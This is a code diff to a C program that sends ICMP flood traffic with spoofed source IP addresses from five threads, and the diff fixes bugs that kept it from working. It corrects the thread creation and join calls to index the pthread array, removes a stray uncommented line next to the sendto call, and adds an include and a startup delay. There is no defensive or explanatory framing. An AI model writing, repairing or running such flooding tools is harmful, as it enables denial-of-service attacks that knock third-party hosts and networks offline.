@@ -7,11 +7,13 @@
 #include<arpa/inet.h>
 #include <pthread.h>
 #include "header.h"
+#include<unistd.h>
 
 char *dest_ip;
 static int PROTO_ICMP = 1;
 
 void *send_icmpflood(void *tmp){
+    sleep(2);
     int *fd = tmp;
 
     char *packet;
@@ -74,7 +76,6 @@ void *send_icmpflood(void *tmp){
         strcat(source_ip, buffer);
         iph->saddr=inet_addr(source_ip);
 
-        send the packet
         if(sendto(*fd, packet, iph->tot_len, 0, (struct sockaddr *)&to, sizeof(to))<0) {
             //perror("Sending error");
         }
@@ -101,7 +102,7 @@ int main(int argc, char *argv[])
     }
     
     pthread_t pthread[5];
-    for(int i = 0; i < 5; i++) pthread_create(&pthread, NULL, send_icmpflood, &fd);
-    for(int i = 0; i < 5; i++) pthread_join(pthread, NULL);
+    for(int i = 0; i < 5; i++) pthread_create(&pthread[i], NULL, send_icmpflood, &fd);
+    for(int i = 0; i < 5; i++) pthread_join(pthread[i], NULL);
     return 0;
 }
